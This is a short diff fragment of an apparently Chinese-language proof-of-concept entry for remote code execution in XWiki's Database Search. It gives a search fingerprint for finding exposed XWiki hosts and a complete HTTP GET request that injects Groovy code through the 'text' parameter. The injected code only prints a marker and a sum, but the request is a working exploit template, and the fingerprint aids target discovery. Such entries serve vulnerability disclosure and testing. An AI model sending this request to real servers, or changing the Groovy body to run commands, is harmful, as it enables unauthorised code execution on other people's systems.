@@ -8,7 +8,7 @@ XWiki 的数据库搜索允许通过搜索文本远程执行代码。这允许�
 body="data-xwiki-reference"
 ```
 
-## poc
+## POC
 
 ```
 GET /xwiki/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7Dprintln%28%22MiTian%20from%22%20%2B%20%22%20search%20text%3A%22%20%2B%20%288888%20%2B%206666%29%29%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 HTTP/1.1
